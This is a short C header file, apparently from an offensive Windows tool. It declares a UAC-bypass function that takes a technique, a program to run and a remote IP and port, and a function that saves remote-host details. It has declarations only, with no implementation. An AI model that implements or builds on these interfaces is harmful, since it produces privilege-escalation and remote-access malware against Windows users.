#pragma once

#ifndef BYPASS_UAC_HEADER_H
#define BYPASS_UAC_HEADER_H


BOOL RunUacBypass(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir);
BOOL SaveRHostInfo(Advapi32_API advapi32, WCHAR* ipAddress, char* port);

#endif